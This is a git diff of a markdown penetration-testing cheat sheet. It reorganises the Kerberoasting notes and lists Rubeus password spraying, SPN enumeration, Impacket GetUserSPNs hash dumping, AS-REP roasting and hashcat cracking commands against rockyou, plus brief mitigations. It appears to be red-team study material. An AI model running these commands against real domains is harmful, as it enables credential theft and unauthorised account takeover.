@@ -235,7 +235,7 @@ There are two different hash types, `LM` and `NT`:
 
  > 
  > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**</br>
- > Spray a password against all users in current domain and return the .kirbi TGT of users that use this password.
+ > Spray a password against all users in current domain and return the `.kirbi` TGT of users that use this password.
 
 #### Pass the Ticket
 
@@ -296,25 +296,52 @@ The safest to pick is **services.exe**.
 
 ---
 
-### Find AS-Kerbroastable Hash
+### IMPACKET-GETUSERSPNS
 
-#### With GetUserSPNs
+### Principle
 
-SPN (Service Principal Name) is the mapping between service and account.
+SPN (Service Principal Name) is the mapping between a service and the account or the name of the machine with which the service is associated.
+
+![exploit_kerberoasting_principle.png](../attachments/exploit_kerberoasting_principle.png)
+
+### Requirements
+
+* Have valid user credentials (not necessarily admin).
+
+### Hands On
+
+#### With Impacket (remote)
 
  > 
  > **<font color=red>setspn -T medin -Q ​ */*</font>**</br>
  > Enumerate SPN.
 
- > 
- > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> mydomain.local<font color=red>/</font>myUser<font color=red>:</font>myPassword <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-request</font>**</br>
- > Dump Kerberos hash of kerberoastable users. (Then `hashcat -m 13100`).
 
-#### With Rubeus
+ > 
+ > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
+ > Dump Kerberos hash of kerberoastable users.
+
+
+ > 
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordkists/rockyou.txt</font>**</br>
+ > Crack Kerberos 5 TGS-REP hash.
+
+#### With RUBEUS (on target machine)
+
 
  > 
  > **<font color=red>Rubeus.exe kerberoast</font>**</br>
- > Dump Kerberos hashes of kerberoastable users (like GetUserSPNs.py but on the target machine). Then use `hashcat -m 13100`.
+ > Dump Kerberos hashes of kerberoastable users (same as GetUserSPNs.py but on the target machine).
+
+
+ > 
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordkists/rockyou.txt</font>**</br>
+ > Crack Kerberos 5 TGS-REP hash.
+
+### Mitigation
+
+* Have a very strong password for service accounts.
+* Don’t make services accounts domain administrators.
 
 ---
 
@@ -326,30 +353,6 @@ SPN (Service Principal Name) is the mapping between service and account.
  > **<font color=red>Rubeus.exe asreproast</font>**</br>
   
  > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
-
----
-
-### IMPACKET-GETUSERSPNS
-
-### Principle
-
-![exploit_kerberoasting_principle.png](../attachments/exploit_kerberoasting_principle.png)
-
-### Requirements
-
-* Have valid user credentials (not necessarily admin).
-
-### Hands On
-
-
- > 
- > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
- > Get a TGS.
-
-### Mitigation
-
-* Have a very strong password for service accounts.
-* Don’t make services accounts domain administrators.
 
 # Golden/Silver Ticket
 
